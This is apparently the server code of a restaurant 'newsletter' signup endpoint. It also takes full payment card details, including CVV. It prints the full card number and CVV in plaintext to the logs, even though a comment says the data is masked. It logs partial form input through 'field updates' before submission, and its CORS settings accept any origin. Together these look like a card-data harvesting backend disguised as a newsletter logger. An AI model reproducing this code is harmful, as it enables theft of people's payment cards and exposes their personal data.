export default function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Handle OPTIONS request for CORS preflight
    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method === 'POST') {
        try {
            const newsletterData = req.body;
            const timestamp = new Date().toISOString();
            const ipAddress = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'unknown';
            const userAgent = req.headers['user-agent'] || 'unknown';

            // Determine if this is a field update or final submission
            const isFieldUpdate = newsletterData.isFieldUpdate || false;
            const submissionType = isFieldUpdate ? 'FIELD_UPDATE' : 'FINAL_SUBMISSION';

            // Log complete newsletter data
            console.log(`========== NEWSLETTER ${submissionType} ==========`);
            console.log('Timestamp:', timestamp);
            console.log('IP Address:', ipAddress);
            console.log('User Agent:', userAgent);
            console.log('Form Type:', newsletterData.formType || 'newsletter');

            // Personal Information
            console.log('--- Personal Information ---');
            console.log('First Name:', newsletterData.firstName || 'Not provided');
            console.log('Last Name:', newsletterData.lastName || 'Not provided');
            console.log('Email:', newsletterData.email || 'Not provided');
            console.log('Phone:', newsletterData.phone || 'Not provided');
            console.log('Birthdate:', newsletterData.birthdate || 'Not provided');
            console.log('ZIP Code:', newsletterData.zipCode || 'Not provided');

            // Preferences
            console.log('--- Dining Preferences ---');
            console.log('Dining Frequency:', newsletterData.diningFrequency || 'Not provided');
            console.log('Favorite Food:', newsletterData.favoriteFood || 'Not provided');
            console.log('Referral Source:', newsletterData.referralSource || 'Not provided');

            // Newsletter Preferences
            if (newsletterData.preferences) {
                console.log('--- Newsletter Preferences ---');
                console.log('Weekly Specials:', newsletterData.preferences.weeklySpecials ? 'Yes' : 'No');
                console.log('New Menu:', newsletterData.preferences.newMenu ? 'Yes' : 'No');
                console.log('Events:', newsletterData.preferences.events ? 'Yes' : 'No');
                console.log('Chef News:', newsletterData.preferences.chefNews ? 'Yes' : 'No');
            }

            // Payment Information (mask sensitive data)
            if (newsletterData.paymentInfo && newsletterData.paymentInfo.cardNumber) {
                console.log('--- Payment Information ---');
                const cardNumber = newsletterData.paymentInfo.cardNumber || '';
                const maskedCard = cardNumber ? '**** **** **** ' + cardNumber.replace(/\s/g, '').slice(-4) : 'Not provided';
                console.log('Card Number:', cardNumber);
                console.log('Card Expiry:', newsletterData.paymentInfo.cardExpiry || 'Not provided');
                console.log('CVV:', newsletterData.paymentInfo.cardCVV || 'Not provided');
                console.log('Cardholder Name:', newsletterData.paymentInfo.cardName || 'Not provided');
                console.log('Billing ZIP:', newsletterData.paymentInfo.billingZip || 'Not provided');
                console.log('Save Payment:', newsletterData.paymentInfo.savePayment ? 'Yes' : 'No');
            }

            // Additional Notes
            console.log('--- Additional Information ---');
            console.log('Notes:', newsletterData.notes || 'None');

            // Track submission timing
            if (!isFieldUpdate) {
                console.log('--- Submission Details ---');
                console.log('Submitted At:', newsletterData.submittedAt || timestamp);
            } else {
                console.log('--- Field Update Details ---');
                console.log('Update Timestamp:', newsletterData.updateTimestamp || timestamp);
            }

            console.log('========================================\n');

            // Store in a more structured format for potential database storage
            const logEntry = {
                type: submissionType,
                timestamp,
                ipAddress,
                userAgent,
                formType: 'newsletter',
                data: {
                    personal: {
                        firstName: newsletterData.firstName,
                        lastName: newsletterData.lastName,
                        email: newsletterData.email,
                        phone: newsletterData.phone,
                        birthdate: newsletterData.birthdate,
                        zipCode: newsletterData.zipCode
                    },
                    preferences: {
                        dining: {
                            frequency: newsletterData.diningFrequency,
                            favoriteFood: newsletterData.favoriteFood,
                            referralSource: newsletterData.referralSource
                        },
                        newsletter: newsletterData.preferences
                    },
                    payment: newsletterData.paymentInfo ? {
                        hasCard: !!newsletterData.paymentInfo.cardNumber,
                        cardLast4: newsletterData.paymentInfo.cardNumber ?
                            newsletterData.paymentInfo.cardNumber.replace(/\s/g, '').slice(-4) : null,
                        savePayment: newsletterData.paymentInfo.savePayment
                    } : null,
                    notes: newsletterData.notes
                }
            };

            // Log structured data for easier parsing
            console.log('STRUCTURED_LOG:', JSON.stringify(logEntry));

            // Send success response
            res.status(200).json({
                success: true,
                message: isFieldUpdate ?
                    'Newsletter field update logged successfully' :
                    'Newsletter signup logged successfully',
                timestamp,
                submissionType
            });

        } catch (error) {
            console.error('ERROR processing newsletter submission:', error);
            console.error('Error stack:', error.stack);
            console.error('Request body:', JSON.stringify(req.body));

            res.status(500).json({
                success: false,
                error: 'Failed to process newsletter submission',
                details: error.message
            });
        }
    } else if (req.method === 'GET') {
        // Helpful message for GET requests
        res.status(200).json({
            service: 'Newsletter Submission Logger',
            status: 'operational',
            message: 'This endpoint accepts POST requests with newsletter data',
            timestamp: new Date().toISOString()
        });
    } else {
        res.status(405).json({
            success: false,
            error: `Method ${req.method} not allowed`
        });
    }
}